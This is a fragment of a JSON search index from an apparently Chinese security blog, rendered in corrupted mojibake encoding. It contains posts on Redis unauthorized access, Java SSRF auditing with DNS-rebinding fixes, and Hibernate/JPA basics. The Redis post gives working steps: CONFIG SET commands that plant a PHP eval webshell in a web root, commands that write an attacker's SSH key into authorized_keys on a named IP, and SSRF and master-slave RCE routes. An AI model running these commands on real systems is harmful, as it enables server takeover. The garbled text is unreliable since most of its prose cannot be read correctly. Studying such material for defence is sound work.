CC1é“¾æµç¨‹å›¾"},{"title":"æµ…è°ˆRedisæœªæˆæƒæ”»å‡»","date":"2025-01-27T11:13:18.216Z","url":"/2025/01/27/%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83/","tags":[["Redisæœªæˆæƒ","/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"categories":[["Redisæœªæˆæƒ","/categories/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"content":"Redisæœªæˆæƒè®¿é—®åˆ©ç”¨æ¡ä»¶ï¼š 1ã€redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ã€‚ 2ã€æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚ æœªæˆæƒè¿æ¥ redis-cli -h 101.xx.xx.xxxï¼Œå¹¶ä½¿ç”¨ infoå‘½ä»¤åˆ—å‡ºå—å®³æœº redisæœåŠ¡ä¿¡æ¯ Redisæœªæˆæƒ getshellåˆ©ç”¨ redisæœªæˆæƒå†™å…¥ webshellå®ç° getshellã€‚ åˆ©ç”¨å‰æï¼šredisæœåŠ¡ç«¯å­˜åœ¨ webæœåŠ¡å™¨ï¼Œä¸”é€šè¿‡æŸç§æ–¹å¼(phpinfoæ³„æ¼ç­‰)è·å¾—Webç›®å½•çš„æ ¹è·¯å¾„ï¼Œä¸”å…·æœ‰æ–‡ä»¶çš„è¯»å†™æƒé™ï¼Œå°±å¯ä»¥åˆ©ç”¨ rediså†™å…¥ä¸€å¥è¯æœ¨é©¬ getshellã€‚ 1ã€å°† rediså·¥ä½œç›®å½•ä¿®æ”¹è‡³ Webæ ¹ç›®å½• config set dir /wwwroot/www/ 2ã€å°† redisçš„æ•°æ®æ–‡ä»¶åç§°(dbfilename)è®¾ç½®ä¸º shell.php config set dbfilename shell.php 3ã€å†™å…¥ä¸€å¥è¯æœ¨é©¬shell config set payload &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; 4ã€ä¿å­˜ save ç”±æ­¤åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èšå‰‘è¿æ¥  åˆ©ç”¨ redisæœªæˆæƒå†™å…¥ sshå…¬é’¥é¦–å…ˆéœ€è¦äº†è§£ sshå…¬é’¥è®¤è¯æœºåˆ¶ï¼š SSH ä½¿ç”¨å…¬é’¥è®¤è¯æ¥è¿›è¡Œæ— å¯†ç ç™»å½•ã€‚ç”¨æˆ·éœ€è¦å°†è‡ªå·±çš„å…¬é’¥æ·»åŠ åˆ°è¿œç¨‹æœåŠ¡å™¨çš„ ~/.ssh/authorized_keys æ–‡ä»¶ä¸­ï¼ŒæœåŠ¡å™¨ä¼šé€šè¿‡å…¬é’¥éªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚å¦‚æœå…¬é’¥åŒ¹é…ï¼Œå°±å¯ä»¥æˆåŠŸç™»å½•ã€‚ åˆ©ç”¨ CONFIG SET å‘½ä»¤æ›´æ”¹ Redis é…ç½® Redis å…è®¸é€šè¿‡ CONFIG SET å‘½ä»¤æ›´æ”¹é…ç½®ï¼Œæ”»å‡»è€…å¯ä»¥å°† dir é…ç½®æ›´æ”¹ä¸ºç›®æ ‡ä¸»æœºçš„ ~/.ssh ç›®å½•ã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡ SET å‘½ä»¤å°†æ•°æ®å†™å…¥è¯¥ç›®å½•ï¼Œè¦†ç›– authorized_keys æ–‡ä»¶ï¼Œæ·»åŠ è‡ªå·±çš„ SSH å…¬é’¥ã€‚ é¦–å…ˆåœ¨æ”»å‡»æœºç”Ÿæˆ sshå…¬é’¥å¹¶ä¿å­˜ï¼š ssh-keygen -t rsa 1ã€å°† sshå…¬é’¥å€¼å†™å…¥åˆ° redisé”® pubKeyä¸­ï¼š cat /Users/gehansheng/.ssh/id_rsa.pub | redis-cli -h 101.42.13.105 -x set pubKey |ï¼ˆç®¡é“ç¬¦ï¼‰ï¼šå°† cat å‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™åç»­çš„å‘½ä»¤ -xï¼šè¡¨ç¤ºä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®ä½œä¸ºå€¼å­˜å‚¨åˆ° Redisã€‚ 2ã€å°†å·¥ä½œç›®å½•è®¾ç½®åˆ° /home/ubuntu/.ssh config set dir /home/ubuntu/.ssh 3ã€å°† redisçš„æ•°æ®æ–‡ä»¶åç§°è®¾ç½®ä¸º authorized_keysï¼Œè¿™æ„å‘³ç€ Redis å°†æ•°æ®å­˜å‚¨åœ¨ /root/.ssh/authorized_keys æ–‡ä»¶ä¸­ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ dump.rdb æ–‡ä»¶ã€‚ config set dbfilename authorized_keys 4ã€ä¿å­˜ save ä½†å°è¯•ä½¿ç”¨ sshå…å¯†è¿æ¥æ—¶å‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹å†™å…¥çš„ authorized_keysæ–‡ä»¶ï¼Œå‘ç°æ˜¯ç”±äºå…¬é’¥å’Œ redisç¼“å­˜ä¸­å…¶ä»–æ•°æ®æ··åˆåœ¨ä¸€èµ·å¯¼è‡´çš„ ä¿®æ”¹å‘½ä»¤ï¼Œæ·»åŠ æ¢è¡Œç¬¦ï¼Œé˜²æ­¢æ•°æ®æ··æ·† (echo -e &quot;\\n\\n&quot;; cat /Users/gehansheng/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ~/Desktop/key.txt æ­£ç¡®æ·»åŠ å…¬é’¥åï¼Œä¾¿å¯ä½¿ç”¨ sshå…¬é’¥å…å¯†ç™»å½• ssh 1xx.xx.xx.xxx é…åˆ SSRF getshellå½“ redisæœåŠ¡ç»‘å®šåœ¨ 127.0.0.1æ—¶ï¼Œåªèƒ½ä»æœ¬åœ°ä¸»æœºè®¿é—® redisæœåŠ¡ç«¯ï¼Œæ­¤æ—¶æ— æ³•ä»å…¬ç½‘ç›´æ¥æœªæˆæƒè®¿é—®å¹¶å†™å…¥ shelläº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ ssrf + gopheråè®®æ¥å†™å…¥ shellã€‚ pythonè„šæœ¬å¦‚ä¸‹ï¼š åˆ©ç”¨è„šæœ¬ç”Ÿæˆ payloadåæ‰“ ssrfå³å¯ã€‚ ![image-20250202165210627]( Redisä¸»ä»å¤åˆ¶ getshellä¸»ä»å¤åˆ¶åŸç†ï¼š ä»èŠ‚ç‚¹ (slaver) å…¨é‡åŒæ­¥ä¸»èŠ‚ç‚¹ (Master) çš„æ•°æ®ï¼ŒåŒæ­¥è¿‡ç¨‹ä¸­ï¼Œä¸»èŠ‚ç‚¹ä¼šç”Ÿæˆä¸€ä¸ªRDBå¿«ç…§æ–‡ä»¶å‘é€ç»™ä»èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹åŠ è½½è¯¥RDBæ–‡ä»¶æ¢å¤æ•°æ®ã€‚ getshellå…³é”®ç‚¹ï¼š ä» Redis &gt;&#x3D; 4.0å¼€å§‹ï¼Œä¸»ä»å¤åˆ¶çš„ RDBä¸­å¯ä»¥åŒ…å«æ¨¡å—(Module)çš„åŠ è½½æŒ‡ä»¤ã€‚å¦‚æœæ”»å‡»è€…ä¼ªè£…æˆä¸»èŠ‚ç‚¹ï¼Œå‘ä»èŠ‚ç‚¹å‘é€åŒ…å«æ¶æ„æ¨¡å—åŠ è½½æŒ‡ä»¤çš„RDBæ–‡ä»¶ï¼Œä»èŠ‚ç‚¹ä¼šè‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œè¯¥æ¨¡å—ã€‚ Redisæ”¯æŒé€šè¿‡åŠ¨æ€é“¾æ¥åº“(.soæ–‡ä»¶)æ¥æ‹“å±•åŠŸèƒ½ï¼ŒåŠ è½½æ¨¡å—å‘½ä»¤å¦‚ä¸‹ module load /path/exp.so è‡ªåŠ¨åŒ– RCEå·¥å…·ï¼š  Exp.so payload: "},{"title":"æµ…è°ˆJavaä¸­çš„SSRFå®¡è®¡","date":"2025-01-24T07:05:42.089Z","url":"/2025/01/24/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SSRF%E5%AE%A1%E8%AE%A1/","tags":[["SSRF","/tags/SSRF/"]],"categories":[["SSRF","/categories/SSRF/"]],"content":"å‰è¨€å‰æ®µæ—¶é—´é¢è¯•æŸå¤§å‚å®‰å…¨å®ä¹ ç”Ÿå²—ä½æ—¶ï¼Œè¢«ç€é‡é—®åˆ°äº† Javaå®¡è®¡ SSRFæ¼æ´æ—¶ï¼Œéœ€è¦é‡ç‚¹å…³æ³¨å“ªäº›ç±» ? æˆ‘ï¼šæˆ‘å®¡è®¡ SSRFæ—¶åŸºæœ¬åªå…³æ³¨ä¸€äº›å…³é”®å­—å‡½æ•°ï¼Œæ²¡æ€ä¹ˆå…³æ³¨è¿‡æ•æ„Ÿç±» ğŸ˜­ğŸ˜­ğŸ˜­ å¸¸å‡ºç°çš„ä¸šåŠ¡ç‚¹SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºä»£ç ä¸­æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLé“¾æ¥è·å–å›¾ç‰‡ã€ä¸‹è½½ç­‰ã€‚ å‡ºç°SSRFæ¼æ´çš„ä¸»è¦ä¸šåŠ¡æœ‰ï¼š (1) é€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ (2) åœ¨çº¿æœåŠ¡ï¼Œå¤–é“¾æ–‡ç« ç¿»è¯‘ (æœ‰é“) (3) é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ï¼ŒPDFå¯¼å‡º (4) åŠ è½½è¿œç«¯é…ç½® å¸¸è§åˆ©ç”¨ç‚¹httpåè®®åˆ©ç”¨url =  fileåè®®åˆ©ç”¨url =  æ€»ç»“ä¸å…¨ï¼Œåç»­æ·±å…¥æ¢ç©¶ ssrfæ‰“å†…ç½‘çš„åˆ©ç”¨ã€‚ é‡ç‚¹å®¡è®¡ç±»&#x2F;å‡½æ•°java.net.URL å’Œ java.net.URLConnectionserviceå±‚ï¼š Controllerå±‚ï¼š java.net.HttpURLConnectionå’ŒJavax.net.ssl.HttpsURLConnectionè¿™ä¸¤ä¸ªç±»éƒ½æ˜¯ java.net.URLConnection çš„å­ç±»ï¼Œåˆ†åˆ«ç”¨äºå¤„ç† httpå’Œ httpsè¯·æ±‚ã€‚ org.apache.http.client.methods.HttpGetå’Œorg.apache.http.client.methods.HttpPostApache HttpClient æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ HTTP å®¢æˆ·ç«¯åº“ï¼Œç”¨äºå‘é€ HTTP è¯·æ±‚ã€‚ okhttp3.Requestå’Œokhttp3.OkHttpClient é™¤äº†å»ºç«‹ HTTP(s)åè®®è¿æ¥ï¼Œè¿˜å¯ä»¥ç›´æ¥é€šè¿‡ Socketå»ºç«‹è¿æ¥ï¼Œæ‰€ä»¥ä¹Ÿè¦å…³æ³¨ Socketç›¸å…³ç±»ã€‚ java.net.Socketsocket.getInputStream().read() å’Œ socket.getInputStream().write() java.nio.channels.SocketChannelsocketChannel.connect() æ€»ç»“ï¼š ä¿®å¤æ–¹æ¡ˆ å¤„ç†æ­£ç¡®302è·³è½¬ï¼ˆåœ¨ä¸šåŠ¡è§’åº¦çœ‹ï¼Œä¸èƒ½ç›´æ¥ç¦æ­¢302ï¼Œè€Œæ˜¯å¯¹è·³è½¬çš„åœ°å€é‡æ–°è¿›è¡Œæ£€æŸ¥ï¼‰ é™åˆ¶åè®®åªèƒ½ä¸ºhttp&#x2F;httpsï¼Œé˜»æ­¢è·¨åè®® (å¦‚fileåè®®ï¼Œé˜²æ­¢ä»»æ„æ–‡ä»¶è¯»å–) è®¿é—®é»‘åå•(ç¦æ­¢è®¿é—®å†…ç½‘)ï¼Œè®¿é—®ç™½åå•(åªå…è®¸è®¿é—®ç™½åå•ä¸­çš„åœ°å€) è®¾ç½®å¸¸è§webç«¯å£ç™½åå•ï¼ˆé˜²æ­¢ç«¯å£æ‰«æï¼Œå¯èƒ½ä¸šåŠ¡è®¾å®šæ¯”è¾ƒå¤§ï¼‰ é˜²å¾¡ SSRFä¸­çš„ dnsé‡ç»‘å®šæ”»å‡» DNSé‡ç»‘å®šæ”»å‡»ä¸é˜²å¾¡ç»•è¿‡é€»è¾‘å…ˆå¯¹ç”¨æˆ·è¾“å…¥çš„ urlè¿›è¡Œä¸€æ¬¡ dnsè§£æï¼Œåˆ¤æ–­å…¶æ˜¯å¦åˆæ³•ï¼Œè‹¥åˆæ³•åˆ™ç»§ç»­è¿›å…¥åˆ°ä¸‹ä¸€æ­¥é€»è¾‘ä¸­ï¼Œä¼ªä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š é€šè¿‡ isValid()æ ¡éªŒåï¼Œç«‹å³å°† dnsè§£æç»“æœè®¾ç½®ä¸ºæœåŠ¡å™¨å†…ç½‘åœ°å€ (å¦‚ )ï¼Œåœ¨æœåŠ¡å™¨è¯·æ±‚ urlï¼Œç¬¬äºŒæ¬¡è§£æåŸŸåã€‚æ­¤æ—¶å·²ç»è¿‡äº†ttlçš„æ—¶é—´ï¼Œè§£æè®°å½•ç¼“å­˜IPè¢«åˆ é™¤ï¼Œæ‰€ä»¥é‡æ–°è¿›è¡Œ dnsè§£æï¼Œè§£æç»“æœä¸ºæœåŠ¡å™¨å†…ç½‘åœ°å€ï¼ŒæœåŠ¡å™¨è¯·æ±‚å†…ç½‘æ•°æ®å¹¶è¿”å›ç»™æ”»å‡»è€…ï¼š è§£æè®°å½•ç¼“å­˜ç»´æŒæ—¶é—´ï¼š åœ¨ä¼ ç»Ÿçš„ssrfä¿®å¤æ–¹æ¡ˆä¸­ï¼Œç”±äºjavaä¼šå­˜åœ¨é»˜è®¤çš„dnsç¼“å­˜ï¼Œæ‰€ä»¥ä¸€èˆ¬è®¤ä¸ºjavaä¸å­˜åœ¨DNS rebindingé—®é¢˜ã€‚ä½†æ˜¯è¯•æƒ³è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œå¦‚æœåˆšåˆšå¥½åˆ°äº†DNSç¼“å­˜æ—¶é—´ï¼Œæ­¤æ—¶æ›´æ–°DNSç¼“å­˜ï¼Œé‚£äº›å·²ç»è¿‡äº†SSRF Checkè€Œåˆæ²¡æœ‰æ­£å¼å‘èµ·ä¸šåŠ¡è¯·æ±‚çš„requestï¼Œæ˜¯å¦ä½¿ç”¨çš„æ˜¯æ–°çš„DNSè§£æç»“æœã€‚å…¶å®ç†è®ºä¸Šåªè¦åœ¨å‘èµ·ç¬¬ä¸€æ¬¡è¯·æ±‚åç­‰åˆ°30ç§’ä¹‹å‰çš„æ—¶å€™å†è¯·æ±‚å³å¯ï¼Œä½†ä¸ºäº†ä¿è¯æ•ˆæœï¼Œå¯ä»¥åœ¨28så·¦å³ï¼Œå¼€å§‹ä»¥ä¸€ä¸ªè¾ƒçŸ­çš„æ—¶é—´é—´éš”å»å‘é€è¯·æ±‚ï¼Œä»¥è¾¾åˆ°æ—¶é—´ç«äº‰çš„æ•ˆæœã€‚ â€” ã€ŠSSRFå®‰å…¨æŒ‡åŒ—ã€‹ ä¿®å¤æ–¹æ¡ˆ (final)ç”±äº DNSé‡ç»‘å®šæ”»å‡»çš„å­˜åœ¨ï¼Œä¸å¾—ä¸è®¾ç½®ä¸€ä¸ªæ›´åŠ å…¨é¢çš„ä¿®å¤æ–¹æ¡ˆï¼š å»é™¤urlä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œé™åˆ¶åè®®ä¸º http&#x2F;https åˆ¤æ–­æ˜¯å¦å±äºå†…ç½‘ip (é»‘åå•) å¦‚æœæ˜¯åŸŸåçš„è¯ï¼Œå°†urlä¸­çš„åŸŸåæ”¹ä¸ºip - é˜²æ­¢dns rebindingï¼Œç›´æ¥è®¿é—® ipä¸ç”¨äºŒæ¬¡è¿›è¡Œdnsè§£æ è¯·æ±‚çš„urlä¸º3ä¸­è¿”å›çš„url ä¸è·Ÿéš30xè·³è½¬ï¼ˆè·Ÿéšè·³è½¬éœ€è¦ä»1å¼€å§‹é‡æ–°æ£€æµ‹ï¼‰ "},{"title":"Hibernateæ¡†æ¶ä¸­çš„SQLæ³¨å…¥","date":"2025-01-21T03:24:22.726Z","url":"/2025/01/21/Hibernate%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQLæ³¨å…¥","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQLæ³¨å…¥","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"å‰ç½®æ¦‚å¿µï¼šPOJOPOJO (Plain Old Java Object) æ˜¯æŒ‡ æ™®é€šçš„ Java å¯¹è±¡ï¼Œå®ƒæ²¡æœ‰ç»§æ‰¿è‡ªç‰¹å®šçš„ç±»ï¼Œä¹Ÿæ²¡æœ‰å®ç°ç‰¹å®šçš„æ¥å£ã€‚POJO æ˜¯ä¸€ç§ç®€å•çš„ã€ç¬¦åˆ Java Bean è§„èŒƒçš„ Java ç±»ã€‚å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªæœ€æ™®é€šçš„ JavaBeanã€‚ POJO çš„ç‰¹ç‚¹æ˜¯ï¼š æ— ç‰¹å®šç»§æ‰¿ï¼šPOJO ä¸éœ€è¦ç»§æ‰¿è‡ªç‰¹å®šçš„çˆ¶ç±»ï¼Œé€šå¸¸ä¸ç»§æ‰¿ä»»ä½•æ¡†æ¶ç±»ã€‚ æ— ç‰¹å®šæ¥å£ï¼šPOJO ä¸éœ€è¦å®ç°ä»»ä½•ç‰¹å®šçš„æ¥å£ã€‚ å±æ€§å’Œæ–¹æ³•ï¼šPOJO é€šå¸¸æ‹¥æœ‰ä¸€ç»„ç§æœ‰å±æ€§ï¼Œå¹¶æä¾›å…¬å…±çš„ getter å’Œ setter æ–¹æ³•æ¥è®¿é—®è¿™äº›å±æ€§ã€‚ æ— æ¡†æ¶ä¾èµ–ï¼šPOJO ä¸ä¾èµ–äºä»»ä½•ç‰¹å®šçš„æ¡†æ¶æˆ–æŠ€æœ¯ï¼ˆå¦‚ EJB ç­‰ï¼‰ã€‚å®ƒæ˜¯ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ Java ç±»ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š åœ¨ ORMæ¡†æ¶ä¸­ï¼ŒPOJOç±»é€šå¸¸ç”¨ä½œæ˜ å°„æ•°æ®åº“ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ORMæ¡†æ¶ORMæ¡†æ¶ï¼ˆObject-Relational Mapping Frameworkï¼Œé¢å‘å¯¹è±¡ä¸å…³ç³»å‹æ•°æ®åº“æ˜ å°„æ¡†æ¶ï¼‰æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå®ƒä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿåœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ä½¿ç”¨å¯¹è±¡æ¥è¡¨ç¤ºæ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œè€Œä¸éœ€è¦ç›´æ¥æ“ä½œæ•°æ®åº“ä¸­çš„è¡¨ã€è¡Œå’Œåˆ—ã€‚ORMæ¡†æ¶é€šè¿‡å°†å¯¹è±¡çš„å±æ€§ä¸æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µç›¸æ˜ å°„ï¼Œå®ç°äº†é¢å‘å¯¹è±¡ç¨‹åºä¸å…³ç³»å‹æ•°æ®åº“ä¹‹é—´çš„è½¬æ¢ã€‚ ORMçš„æ ¸å¿ƒæ¦‚å¿µæ˜¯å°†æ•°æ®åº“ä¸­çš„è¡¨ï¼ˆtableï¼‰ã€åˆ—ï¼ˆcolumnï¼‰ã€æ˜ å°„åˆ°ç±»ï¼ˆclassï¼‰ã€å’Œ**å¯¹è±¡ï¼ˆobjectï¼‰**çš„å±æ€§ï¼ˆfieldï¼‰ï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥é€šè¿‡æ“ä½œå¯¹è±¡æ¥è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œè€Œä¸å¿…ç¼–å†™å¤§é‡çš„SQLè¯­å¥ã€‚ORMæ¡†æ¶é€šè¿‡ä¸ºå¼€å‘è€…æä¾›é«˜çº§APIï¼Œç®€åŒ–äº†æ•°æ®åº“æ“ä½œï¼Œè‡ªåŠ¨ç”ŸæˆSQLè¯­å¥æ¥å®Œæˆå¯¹æ•°æ®åº“çš„å¢ã€åˆ ã€æ”¹ã€æŸ¥æ“ä½œã€‚ å·¥ä½œåŸç† ORMæ¡†æ¶é€šè¿‡æ˜ å°„å…³ç³»å°†æ•°æ®åº“è¡¨ä¸ç¨‹åºä¸­çš„ç±»å…³è”èµ·æ¥ã€‚é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š ç±»æ˜ å°„ï¼šæ¯ä¸ªæ•°æ®åº“è¡¨é€šå¸¸å¯¹åº”ä¸€ä¸ªç±»ï¼Œç±»çš„æ¯ä¸ªå­—æ®µï¼ˆå±æ€§ï¼‰æ˜ å°„åˆ°è¡¨çš„æ¯ä¸€åˆ—ã€‚ç±»å¯¹è±¡çš„æ“ä½œä¼šåæ˜ åˆ°æ•°æ®åº“è¡¨çš„æ“ä½œã€‚ CRUDæ“ä½œï¼šå¼€å‘è€…é€šè¿‡æ“ä½œå¯¹è±¡ï¼ˆå¢ã€åˆ ã€æ”¹ã€æŸ¥ï¼‰ï¼ŒORMæ¡†æ¶ä¼šè‡ªåŠ¨å°†è¿™äº›æ“ä½œè½¬æ¢ä¸ºç›¸åº”çš„SQLè¯­å¥ï¼Œå¹¶æ‰§è¡Œè¿™äº›SQLè¯­å¥æ¥æ“ä½œæ•°æ®åº“ã€‚ æ˜ å°„é…ç½®ï¼šORMæ¡†æ¶é€šå¸¸éœ€è¦é€šè¿‡æ³¨è§£æˆ–XMLé…ç½®æ–‡ä»¶æŒ‡å®šç±»ä¸æ•°æ®åº“è¡¨ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ ç†ŸçŸ¥çš„ ORMæ¡†æ¶åŒ…æ‹¬ Mybatis-plusï¼ŒHibernateç­‰ç­‰ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” JPAJPAï¼ˆJava Persistence APIï¼‰æ˜¯ä¸€ä¸ªç”¨äº Java å¹³å°ä¸Šçš„å¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆORMï¼‰è§„èŒƒï¼Œå®ƒæä¾›äº†ä¸€ç»„æ ‡å‡†åŒ–çš„æ¥å£å’Œæ–¹æ³•æ¥ç®€åŒ– Java åº”ç”¨ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„äº¤äº’ã€‚JPA ä½¿å¾— Java å¼€å‘è€…å¯ä»¥ä»¥é¢å‘å¯¹è±¡çš„æ–¹å¼æ“ä½œå…³ç³»å‹æ•°æ®åº“ï¼Œå¹¶ä¸”ä¸åº•å±‚æ•°æ®åº“çš„ç»†èŠ‚åˆ†ç¦»ï¼Œé¿å…äº†ç›´æ¥æ“ä½œ SQL è¯­å¥ã€‚ JPA æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªå®ç°ï¼Œè€Œæ˜¯ä¸€ä¸ªè§„èŒƒã€‚å®ƒå®šä¹‰äº† Java åº”ç”¨ç¨‹åºä¸å…³ç³»å‹æ•°æ®åº“äº¤äº’çš„æ ‡å‡†ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡å®ç° JPA è§„èŒƒçš„ ORM æ¡†æ¶ï¼ˆå¦‚ Hibernateã€EclipseLinkã€OpenJPAï¼‰æ¥ä½¿ç”¨ JPA åŠŸèƒ½ã€‚ æ¦‚å¿µç»„æˆï¼š å®ä½“ç±»ï¼ˆEntityï¼‰ï¼š å®ä½“ç±»æ˜¯ä¸€ä¸ª Java ç±»ï¼Œå®ƒä»£è¡¨äº†æ•°æ®åº“ä¸­çš„ä¸€å¼ è¡¨ã€‚æ¯ä¸ªå®ä½“ç±»çš„å®ä¾‹ä»£è¡¨è¯¥è¡¨çš„ä¸€è¡Œè®°å½•ã€‚å®ä½“ç±»é€šå¸¸éœ€è¦é€šè¿‡æ³¨è§£ï¼ˆå¦‚ @Entityï¼‰æ¥æ ‡è¯†ï¼ŒJPA ä¼šæ ¹æ®è¿™äº›å®ä½“ç±»ç”Ÿæˆå¯¹åº”çš„æ•°æ®åº“è¡¨ã€‚ æŒä¹…åŒ–ä¸Šä¸‹æ–‡ï¼ˆPersistence Contextï¼‰ï¼š æŒä¹…åŒ–ä¸Šä¸‹æ–‡æ˜¯ JPA ç®¡ç†å®ä½“çš„ç”Ÿå‘½å‘¨æœŸçš„å®¹å™¨ã€‚å®ƒè´Ÿè´£è·Ÿè¸ªæ‰€æœ‰å·²æŒä¹…åŒ–å®ä½“çš„çŠ¶æ€ï¼Œå¹¶ç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å’ŒæŒä¹…æ€§ã€‚æŒä¹…åŒ–ä¸Šä¸‹æ–‡ä¸äº‹åŠ¡ç´§å¯†ç»“åˆã€‚ å®ä½“ç®¡ç†å™¨ï¼ˆEntityManagerï¼‰ï¼š å®ä½“ç®¡ç†å™¨æ˜¯ JPA æä¾›çš„ä¸€ä¸ªæ¥å£ï¼Œå®ƒç”¨äºç®¡ç†å®ä½“å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œæ‰§è¡Œå¯¹æ•°æ®åº“çš„æ“ä½œï¼Œå¦‚ä¿å­˜ã€æ›´æ–°ã€åˆ é™¤å’ŒæŸ¥è¯¢ã€‚å®ä½“ç®¡ç†å™¨æ˜¯ JPA æ“ä½œæ•°æ®åº“çš„æ ¸å¿ƒæ¥å£ã€‚ æŸ¥è¯¢è¯­è¨€ï¼ˆJPQLï¼‰ï¼š JPA æä¾›äº†ä¸€ç§é¢å‘å¯¹è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œç§°ä¸º JPQLï¼ˆJava Persistence Query Languageï¼‰ã€‚JPQL å…è®¸å¼€å‘è€…ä½¿ç”¨é¢å‘å¯¹è±¡çš„è¯­æ³•æ¥æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œè€Œæ— éœ€ç›´æ¥ç¼–å†™ SQLã€‚JPQL æŸ¥è¯¢çš„æ˜¯å®ä½“å¯¹è±¡è€Œä¸æ˜¯æ•°æ®åº“è¡¨ã€‚ æ³¨è§£ï¼ˆAnnotationsï¼‰ï¼š JPA ä½¿ç”¨æ³¨è§£æ¥æè¿°å®ä½“ç±»ä¸æ•°æ®åº“è¡¨ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œ@Entity ç”¨äºæ ‡è¯†å®ä½“ç±»ï¼Œ@Id ç”¨äºæ ‡è¯†ä¸»é”®ï¼Œ@Column ç”¨äºå®šä¹‰åˆ—æ˜ å°„ç­‰ã€‚ äº‹åŠ¡ç®¡ç†ï¼š JPA æä¾›äº†å¯¹äº‹åŠ¡çš„æ”¯æŒï¼Œç¡®ä¿æ“ä½œçš„åŸå­æ€§ã€‚å®ƒå¯ä»¥ä¸ JTAï¼ˆJava Transaction APIï¼‰è¿›è¡Œé›†æˆï¼Œå®ç°åˆ†å¸ƒå¼äº‹åŠ¡æ§åˆ¶ã€‚ JPA å¸¸è§æ³¨è§£ï¼š @Entityï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªç±»æ˜¯å®ä½“ç±»ï¼Œæ˜ å°„åˆ°æ•°æ®åº“è¡¨ã€‚ @Idï¼šç”¨äºæŒ‡å®šå®ä½“ç±»çš„ä¸»é”®ã€‚ @GeneratedValueï¼šç”¨äºæŒ‡å®šä¸»é”®çš„ç”Ÿæˆç­–ç•¥ã€‚ @Columnï¼šç”¨äºæŒ‡å®šå®ä½“ç±»å±æ€§å’Œæ•°æ®åº“åˆ—ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ 